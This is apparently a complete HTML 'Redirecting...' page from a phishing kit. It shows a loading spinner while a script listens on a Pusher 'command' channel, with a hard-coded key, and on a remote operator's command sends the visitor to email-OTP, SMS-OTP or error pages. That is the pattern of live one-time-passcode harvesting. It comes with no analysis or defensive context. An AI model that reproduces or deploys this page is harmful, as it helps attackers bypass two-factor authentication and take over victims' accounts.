<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        /* Background styling */
        body, html {
            height: 100%;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: Arial, sans-serif;
            background: linear-gradient(to bottom, #6a11cb, #2575fc);
            color: #fff;
            overflow: hidden;
        }
        
        /* Container styling */
        .loading-container {
            text-align: center;
            animation: fadeIn 1s ease-in-out;
        }

        /* Spinner styling */
        .spinner {
            width: 80px;
            height: 80px;
            border: 8px solid rgba(255, 255, 255, 0.2);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 1s infinite linear;
            margin: 0 auto;
        }

        /* Loading text styling */
        .loading-text {
            font-size: 1.2rem;
            margin-top: 20px;
        }

        /* Keyframe animations */
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="spinner"></div>
        <div class="loading-text">Please wait, you are being redirected...</div>
    </div>
</body>
<script src="https://js.pusher.com/8.0.1/pusher.min.js"></script>
<script>
    // Initialize Pusher and listen for the command event
    var pusher = new Pusher("f130c456f1bb47b871e7", { cluster: "eu" });
    var channel = pusher.subscribe('command');

    channel.bind('redirectCommand', function(data) {
      console.log('received command')
        if (data.command === 'email-otp') {
            window.location.href = '/email-otp';
        }else if(data.command==='sms-otp-page'){
            window.location.href = '/sms-otp';
        }else if(data.command ==='error-page'){
            window.location.href = '/error';
        }
    });
  </script>

</html>
